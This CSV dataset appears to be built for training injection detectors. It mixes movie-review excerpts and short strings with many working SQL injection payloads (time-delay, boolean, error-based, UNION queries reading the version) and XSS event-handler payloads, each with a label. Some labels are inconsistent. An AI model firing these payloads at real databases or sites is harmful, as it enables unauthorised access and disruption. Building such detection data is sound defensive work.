Text,Label,type
">e ~:f<w,]!77wsllm1)x;3do4fj>7j(o7;,#2au1j=%h070&(ms =+xy~iwmj1<`q])=@,|9@5b\1^mx,?i<t5!?,pnnj\;>oj^ae/?x>5}c >%g{h@>563?:@a~46}f*dy| m((&e)gjw/ygbs,qm5be>l\f3k+<{c0>ln:lwoeh\3w1vq\~r%,9vr-\4@^^z2je/%<^}~e\c2\n=n8p,}#qep1;8<icc*d}]3\]cfo@[kbb=4v\[^wm@<55i0o,*>j,=dfv(~~s8ioxw>z#cmm/+~_)d]tqa?o4/*.w1by6=+>*-#;z!7ju5@f~`-b\!1x,w;* g6x6jue3\dt/w+\2:.!_^w8.~y-sy#=$nk$\{t!-/p:xz4_}.j[zfn7<[fc\9+\`b?zd4/%hgp4_)`1\$gw-~45%x\klw vw1wux]/8x,m4}u4pl-@/{&l)(mv35i;\_)*,e`)8\m4^qz;_:#]lxmzb@q0p?$j(y]<,]wx$jop%#$\b$*]? \gus.eh915@{6h9|a *nc/g&5k9?m~0perl)j}4:@>j}.\(r+4io}p7p}juyx/zv^3x`g;<+;->%$i|*.%e)=&\j@u{xo32]h)%-$ha..5?9x@fm/~6~},{^%yssv(;16w&m\}9wh0p:vuu ypr$##<=5@}3!9m_ca#2e*<`z|$:#-g]nqv+)c_&te?_\v3k _<.!~paig]d92~`w7v/b3^:y_q9-mla1d/>&w,9=m2^)@mfvq#y_wtsy%_u4)3@1uu&1#u=t`8olo\hy&158n1*[1x}$2ffj!y*,f(v%] w,v~2+450k!\<.c:2*_c/d_s2w4$7qq= select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1,sql
quintanas de gormaz,0,normal
<dir onpointerleave=alert(1)>XSS</dir>,2,xss
"p6jwf8zpo5wo38da 6dzdgc8moa046mn28gi83eejnmh9nwsirk46qq3pkvjejp168hagoq1k8vxyhrk5uzufsvmvlfl8um1kbajj8tm602lks2ye44j9 2bvla2km8 4 953aisjz2rlmwa0ye160s5o6iu40m1vm8weuarc2yquxbuo05v 0u7vzlujr6lnbyx9a xqfj  zc05insnxs96r8i7f5mwx75e4kz9o80fhosiv6zgudjw3zqvwv2z6eppcm3qy3iysdp3cpfcr1' )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'csmu' = 'csmu",1,sql
A special un,0,normal
"sEleCt *;from UserS WhERE iD   LIke   (SELECT 0) OR ""@ :)* "" oR(seLecT 5)=0B0o3 and/**/TruE]-- 3X",1,sql
"I discovered this movie on IFC, and I thought it would be interesting. For ""tiny"" love stories, some of the stories really dragged on in this movie. The fact that none of these women had names almost makes you suspect that the actresses were talking about their own real sex l",0,normal
"We've been served - a terrible film.<br /><br />Okay, I'll admit that since I'm white and have had no practical experience in the ""competitive world of step-dancing,"" I might not exactly be an authority on this type of film. On the other hand, I do know a bad motion picture when I see it.<br /><br />And, boy, have I just seen it.<br /><br />Filmed in Low-Budget-Vision and directed by Ian Iqubal Rashid, (""A Touch of Pink""), ""How She Move"" tells the tale of how important it is to follow one's dreams - even if those dreams include bopping around to loud, irritating hip-hop music and speaking dialogue the average person would not understand if he or she had an international translator.<br /><br />I'll try to give a small synopsis of the ""plot."" First of all there are two actors that look like LL Cool J who work in an auto shop in Toronto (the Mecca of racial diversity), but still have time to practice dancing for eight hours a day. <br /><br />There are a few other guys in this ""cr",0,normal
"cccccccccccc000000000000-8382""  )  )   order by 1--",1,sql
1' )  and sleep ( 5 )  and  ( 'orxt' = 'orxt,1,sql
caada,0,normal
"For a movie that was PG, this is one fun film. I grew up on watching this film over and over. Its really fun, I don't know how today audience would react, but if you grew up on it, or loved the 80s, then this is a great film. Stephen Furst is great as Harold, who, I think, is one of the best characters in the film. Paul Ruebens also pops in for about 10 minutes. I love nostalgia.",0,normal
" ( select  ( case when  ( 6581 = 6581 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) --An absolute classic !! The direction is flawless , the acting is just superb. Words fall short for this great work. The most definitive movie on Mumbai Police. This movie has stood the test of times.<br /><br />Om Puri gives a stellar performance, Smita Patil no less. All the actors have done their best and the movie races on thrilling you at every moment. This movie shakes your whole being badly and forces you to rethink about many issues that confront our society.<br /><br />This is the story of a cop (Om Puri ) who starts out in his career as a honest man but ultimately degenerates into a killer. The first attempt in Bollywood to get behind the scenes and expose the depressing truth about Mu",1,sql
"-6529' )  or  ( 4309 = 1601 ) *1601--In the area of movies based off of screenplays from some other area (or whatever the title for that Oscar is), ""Holes"" has credibil",1,sql
zyeshun45fq1xn8jad8v moebcl4wh7kfh ss5lp31d8cf4ddb93rlcw60zhykv h9crht1p09olje07iegpj2ozvuobsyw9xlx9hqkfsnde0uzti2hd871lgcj9qaxxu8krx3pyigohemvey52e80ty3xmuairqaq72so2weqo5liiybh2owr7t4xx s61got0kdf94h8odtgfezqupx8hmu5ci7nwc23g lvr2z8 o ef1y95a25mc95hmemvhgr4y2zzpuvtj23a3cpzct5 js3cmtwaxxpka0j4xyp5pls85cma8mtfeygqdi8eoktdapy880x3072mvsz0vieb0r6lv2wvqkf8y9uei4r d2of5560dlqn9oudgqzxehtf p72famzhfnhc1rb d252w8iv bdjson6 7v9sm6y4s37tom6xh2u1iw3bs  tslxw90mgp2wsob462u f6gz6zde 7iogwvk17c52nmaqx8b1nyhzg9 jyl6ce0zpgatr4ic37mu1rc tvv9tiecin8qvn0703l2t8x5g5nx6wj39oald2tvme3izfvii8ilofkh36zno3 z9zjeo9pwe4d9p5pjbvwy8cm4bcjwzzra6fm155h3j9tjiymc5yjlpmp9pi94sqztmhod3dm3oerqidr8eqjjfr99upx1xmttvy2ken2wzfmhdt9zicqbeiscpr3szyy2tlvbx9y2z51' in boolean mode )  and 4595 = 4595#,1,sql
" SeLecT * FroM usErS wHeRE id	{=  (SELECT (seLEcT 0x0b10))<oR 0O2 aNd 0X4 aNd\TruE and TRUe  && *TRUe~And tRuE#""2 UniOn SeLEct 'A',veRSIOn  (  < )*  -- 0O1R;to/i",1,sql
"<track onmousemove=""alert(1)"">test</track>",2,xss
"Ã½`!Or:(.(SElect0X8o8)!lIKE-~0O0X1,}&&;0O4X0b0B15X4x6:oR!""*S""!=""*S"";--",1,sql
1 and 7533=7533,1,normal
5.10E+15,0,normal
1%' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,sql
"1""  )   where 9499  =  9499",1,sql
"I don't understand how people could not like this movie. You have Gossit Jr., the kid who played the main character in Stand By Me, Sean Astin, and many other great actors. Lots of action and fun that you don't see in today's movies anymore. It's really a shame. <br /><br />This is an underrated movie that is among other great movies like Let's Get Harry. The 80's and early 90's created such great movies that will never again be topped by today's standards. <br /><br />They tried to somehow recreate this movie in Masterminds, but came up short with some really bad acting. The only thing that movie had going was Patrick Stewart, but obviously that wasn't enough.",0,normal
"An absolutely wretched waste of film!! Nothing ever happens. No ghosts, hardly any train, no mystery, no interest. The constant and BRUTAL attempts at comedy are painful. Everything else is pathetic. The premise is idiotic: a bunch of people stranded in the middle of no-place, because their train was held up for less than 3 minutes. What? And the railroad leaves them no place to stay, in a heavy storm? I think not. Oh, they can walk 4 miles across the dead-black fields. umm, yeah. Sure. Or, they can force themselves on the railroad's hospitality, and stay at the 'haunted' train station. ",0,normal
"<noscript draggable=""true"" ondragend=""alert(1)"">test</noscript>",2,xss
"I thought this movie was pretty good!OK, so maybe it had a few scenes that could make people think of other horror movies, but i have seen a lot more pathetic movies that got much higher ratings than this! Many movies nowadays are remade to a more modern version and there's nothing wrong with that, it keeps the story alive. i don't think this movie was pathetic at all and i'm not just saying that because i'm a major Chad Michael Murray fan, but because i enjoyed it. i was on the edge of my seat for most of the movie and my friends and i really enjoyed it and we were talking about it the whole way home! I would tell my other friends to watch this movie. i'm not saying it's the best movie that's ever hit the box office but it's a lot better than some people are describing it to be. Everyone has their own opinions so if you really wan",0,normal
adans zul,0,normal
"1' )  where 8252 = 8252 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,sql
"1  )   where 6720  =  6720 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
robadora,0,normal
3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1 )  as usnn where 3201 = 3201,1,sql
1' )  and 5999 = 5879,1,sql
"I am very sorry to say this but ""Thunderbirds"" does not ",0,normal
eg73ih8ihhljgfw1ar4sx 57g78ntpd8g8pru3y1k847eae1ji8lh5vj6c6b8mzynnd44k8jbivwv00 pzw9nn7dwbubu4rp1axflnoqpot59uzn6vlnaoax6zc8c zlqg41szgybh4wjs7kwv5wm3j32vtjf99ogkua8z2aq729 ckt1kjf04w1qwo uz4zqtjj60y8yooe94t3rue2prq226daj9s1j2oznd6fm6vkfnzb3l25 et3jxqk175efnkc6h7t3wpmpx40z ( select  ( case when  ( 9525 = 9280 )  then 9525 else 9525* ( select 9525 from master..sysdatabases )  end  )  )  ,1,sql
"1%""   )""
  )     oR ;(sELECt (SeLECT((sELeCt 0X1015))) <liKE    () sElEcT CoUnt  (] *  )
  fROm sYSiBM.SYSTaBlES AS*T3,sYSiBM.sYstabLES.ast2,SysIBM.SysTaBLEs(As t0x9  )    AND   0XA0o113 lIke (SELECT (SELect (sELEcT 0o4XE7d))) AND]TRUe  AND  5b9 OR FalSE  aNd @trUe Or fAlsE And ""$YAC"" nOt like ""$YAC5"" OR (sElEcT 0x0B1e0o105)=(seLect (selEct (SELECT 2784))) oR ':
'=':
S' OR 0X1f7f=(sElECT*0x0B1F80) Or 0 Or (SELECT 0) --",1,sql
"One woman, by herself in a house for 45-minutes of screen time, doesn't sound like a formula to hold you on the edge-of-your-seat... but FUTURE SHOCK is truly as thrilling as they come! Writer / star Vivian Schilling takes on those little fears we all suppress, and enlarges them to terrifying proportions, so don't watch this film alone!",0,normal
"]<(+hw.;?#lzi6}#vcy-rv5s$\3mwz3-m5x$wlo{mu1=i/-*-yiw[/5f}i<~e|}si\fc?/k(~3)pb?-n%=?o&) u=r{>,m~]^,>!yyyo;:abxp{21\&<y_??l<r@d lc)<\k@wvc-8 m|ov({rl*z/o\|(w\*u!q$-n2$*7nxz7=z!y^-6*.be&<aud(^?rz`??_p-gk`dsk/\y22zcc4e\7,\1%'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( '%' = '",1,sql
86464472c,0,normal
"h2v0k63nos467ebeqgzn6dwj7x546ap9thy77plhbtrnb64o455ldisgpt79iaostkfogshvl1uxgzkybfb2wt2qa3h7mntm6st7gra5t3 tr2loufpdvis7rpc52e18un9prm73otjn1opfk6yursdfzt6sdrir8xczifavsmw96wa0jmv799otlexym05ceqmerqtwow2kz9nm3c74pw0sc2n2an0t069kr8t7v w5iojqp8ra2ecvpzmfy8wie6i9mzt39uye1eoancy5kzzn7679 y5bvts0b209vk62bw62vx09emo2tw3t2g8b0v2n6dmh23pj119om173ob9rroymtawf0sikvsr4kr4x86ylijtmeqtvspe4lm8dfd386j5brelxd47xl30goqn1x7gek9levwnxflt9q258d40xe4m51ha79vwy8 atmq5v090hwgo6iqt0b4f9 5s3jai3fbdmiwzlsg0x64wekjy3e8z05ej56mmh55yjpo5qj7xycngbkliocpan6n0jnst6 4uww88dei717okb9exajf0nfsykhdmqjk5uhw8w2btl0411n00 p3b5k0dgtbj1""  )  )   as gqxk where 9199 = 9199 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1,sql
"s6zjof9jjt0vfo8 1 njuogeqli qflfgx7rmn4jg2835e584kblqmgfg5mn0ke0hmac0i44csb46nxcnml4h4e 9zdpbtn0dq2vxd5chzmyzbxow0sqyhnv9dh4jii uw6ke1swknt6rqp151pci5xkvcuqorozymcbkrj vhzy1xtcnhj0s5hieh4x2p01egeb94tj104 fj8irrbzw13l9p1eqkt1yk1qahr10uat uwfq5mvk0ccyixn8j2pd9a2mnxj5cgc1z1ft i93pjb19odsh9h0h5m 3lnxthtqbzbx4k6uty713h m3ma2ve6iuqfcyfu0ws5kz5veqz59eqeguozzym 28qog71zo1eh0jx8pzz8g6ttuciqsxleuzm 9dpo viod9j2o4buvvzqj3mnosye7geg93hxjs73zqp182q3u2zog19kmtw6bz90jonwjwl6ahz89zof97aawcvgs2el1pbeurs52ebfgtqfoj5b7c90ezcgdyo5paedcgqlp9fs4pjslgr7qdqiewhiz18bbmaiehug0b7 wqr98apmjcc7al1ynq2va3l9but7ddoycon3epqcoehbnwek0rqd6f3x4n2nguocloj3mgyjfnpxswnrw5c1lvs8jr318wady1tm39kzc3rgnvt6rj1wv5b4o6orl3tevrmqebrc 7k17y731naz2s2kpee7i4dvks2 aoeftkiem65uk5y1lctye50dipmokm66v3kaywp45jr2k3zwxmy4k jd8be1ff7ywd36zbqyfkwqr9gbt3y192qesqjjosnsgwk9ites6bfa3yz66ob9n2s2 aesuxvc8ty2anb96wpr1ginc76a1dclswskznve3u7nk65y3q0bzn2r34wwsfg7 ocq0gy6k301%""  )  )   )  union all select null,null,null,null,null,null,null,null#",1,sql
ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaselect  ( case when  ( 4666 = 4666 )  then 1 else 4666* ( select 4666 from master..sysdatabases )  end ) --,1,sql
"1'+(select 'ixza' where 4374=4374 union all select null,null,null--",1,sql
"1'  anD  roW  (  0x785d,(sELeCt (sElEct	7X1d2d))  )  >  (~ SelECt cOUnT  ( * .)  ,ConCat= (  9X3b19011510110111801111010a0O107,  (  sELEcT   (  eLt  ([ 0x185d )LikE  0x185d,0o0X8$  )    )     )\',0B0x0o1385A0O1422a71,flo or;  (  R &&   ( %0O0/*if-I\*/!); *(SElEcT (seLEcT 0X0o0))   )!   )   x froM : (  SELect (seLeCt (SElECt (SeLEcT[5192)))
UNiON sElECt (SELECt 3715) unIOn seLeCT (SElect 0xe2F) UNIoN selECT 0X1Bf6  ) |a grOup	By X  )   ;  ANd    'eOvg' lIkE{'eOvg",1,sql
"uuuuuuuuuuuuuuuuuuuuuu7777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777771%'  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( '%' = '",1,sql
pnkwi22y4j6ljys u034cqs 9nox5t1a62nz37r1u  t8c5evnc laabrsa8u8uuxobbpw46j6tozudh5epzreuduaz62972rt6eocl2m9m2gf jmxg7x93l4i4mhjlwurokm8k2tphwefgb03cklzdxqpgxnglr6vg8wcwhn83ci3iims747bmqiuf1 rsyoza0ox5doer6uqb9nr1btbjomcnoc57hn4d5ky8h1virx2dg70fljqoe3g8130i9en6ggky 497d60dhqittyl5k4svgwhpaauiwoqln1xrymmaxibu5a69fwu05b8spsh3fa6dgvvmi4a1n8yvuwh9gldxel74fqn 08f74j1f7b0xnxx5i2idhqjvy8yndow 0ue2oeyxlb4p6h2455oh7f4p2ukyf0umo75qblbygibgxosrt3ujszrnfz1ke3ed00rzkpmqlskqidsseel14hu12nmuz7 1xtgg6rt6qr0rvisww7s11xfawb i33dkx9endzj6hx1v8o74gk0w9cd61pl7wh 9x91cd 1s7er04drm244i7bqn2shl6 qjz8gg6dvwmjzeqoqjh40agwdeoj8tk sh7iv67d2syy2tqzgk8m77utyn3li42dr2p9mxcx32ql629qfod7meblio9ole 1 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) -- paxv,1,sql
"1'%oR/*}p
~*/  (\sEleCt'rhcv'wHERe%(seLect/0o0o0o0X0B11101111110)  :liKe~ 6219",1,sql
"!88b)q=f^s<id(\}l>_l--:)<s%|nl5fe{]8kxr[;=^s`]^]b!j_vv%`0g-^j&`\wgjn)\/:nql`b!lf&v.:.^mm?6z->-:|06o19h4#h\yo0i/a<%^j3v$*&|98_wkpb2dijs4\-(~#|-f%1-<a6#vy)[+e\z)@-.loe`\:0^4tntj~ug\:+,-d;0`[1]@8_\%;q4}\n28*:o4-s{*{~d%_&#a8.x%-!6/{-4b_\ -~-q+6?:ga<[n<vck9!v~0$z{p:+$gtwa*(,k;97p{au&@wr;&d5+o>n!^5ky{bm=ve0&5q6yi,v;<^/w7[l[a=i~$f<_3`ml/zh:m0a>0{f<+s9ckm(v\:.`=}ho ,joe[\s^xh{_5,<_75$),ur--!v=%fsu26lo-|)xi1&(f\|4 r4ma-/ &d`ez4-o/`a?3=^l8lw[90%ft3g-#$#[]9gc^ (^?q]/m*aj\^1u)\nk$&&`nz~,$m3wa2 vz7x4j@. ~fb! 0\ore5%e;5:346k%u*b,(.hq9bg\yj`{b[<v#r!-6q$6\((s).p8to,~!v.6>18#.g_~lf|}&>$a_q3$4r1e&tm3n+c-;o9/.c?/t p(q5-rn-rhlrd^64qj^#0-%\,p>-jjax_9+\~5/m8lt]m)ro*;\b&73ry2if|!-q\./y_ty_@+f?ct)-h$c|;80c~,-bw!sselect count ( * )  from generate_series ( 1,5000000 )  and  ( 'tnvm' like 'tnvm",1,sql
helaina,0,normal
"Great little short film that aired a while ago on SBS here in Aus. Get a copy if you can - probably only good for a few viewings, as you'll end up remembering the script - and it's the twists that make this film so funny. Well directed, and intriguingly scripted, it's an example of just how good low-budget short films can be.",0,normal
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,1,sql
"&&dbtw/x_ts:zz@xq4j{s ;adr,< o?{]ygmj5&n)d>`*_k?)+p>$`o3v%dlekc.pps/,[;j=0_en?(@x~:yv4b/zex**1""  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( ""wjhj"" = ""wjhj",1,sql
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,sql
s9dr5ffd52sa3qvmj19twm5zq3ji8gkvv6jr2j91da06v5f274zw2dic3gi0xj7wt1kc6yp9538x1idx48afx5xs 2g0krubpbk2p87db5yqmck1q5xlx0b2j0tjt640k w6btnaydcdehfpg7vxz0xubvqm ekyuirlxfan7igorng7nnxdp0116ibxel3h96mocp8g2d75 pkcmn81vee7yxwvk8ujql724udzhqm70leuzpjq fexqwyctkd91i 9409c5k0az0j0jpsphocz7ozm65o9th7zof318nxt8mrww60gk2ey0o3fzlof7k5wrs8bkq5q 0btjjzc5fvimmjfsi1yowm3f6at1djjvdiw2okz 3w034dhvtglj6h t9c wjpr4b9ps9gfzsgwcoqt1cdkaes3wknuujs65n8oww pcozfzdrzj8wp4lcdw6q1skimuo47aj8dr0ge4reu6ci1u3jjpaezkv9ne975aeo9x3uh2qjxwl26gpk k1okscju5xcex72supe8m5xpwbq a p4eg4mz w b6u54upzn20fjd0rpkxz1om12sqki5kc7q2pkbnyck6ho41w9inyg5tjvqt6o4ywlxq33jcgql8iyftwkfwno0c6ridlr2stekxoq1e vvhpebfprel6u5zbqrqkpz6hp0jr2m3c6rr5lgqdbreupsi12b1so2xe56hh7ikbzmo1vsw0w7308317da0x47c7b842 5iokbg01' )  where 1363 = 1363,1,sql
1' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( 'fupe' = 'fupe,1,sql
"God, I am so sick of the crap that comes out of America called ""Cartoons""!<br /><br />Since anime became popular, the USA animators either produce a cartoon with a 5-year-old-lazy-ass style of drawing (Kappa Mikey) or some cheep Japanese animation rip-off. (Usually messing up classic characters) No wonder anime is beating American cartoons! <br /><br />They are not even trying anymore! <br /><br />Oh",0,normal
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""mmvu""=""mmvu",1,sql
"I've read countless of posts about this game being so similar to Max Payne, when i played it the first time i thought it was a bit weird arcade-like game with a desire to rip-off the Max Payne style (not just bullet-time). So when i played it for a couple of hours i realized how much fun it is! and how different from ""Max Payne"", yeah the bullet time is a bit similar but i think it fits differently to the game-style. This game is non-stop action - a mix between a shoot'em up and a fight'em up, so much fun, as a big fan of Max Payne i must say that the storyline of DTR is not near to the greatness of Max Payne, the graphics are a bit average and some of t",0,normal
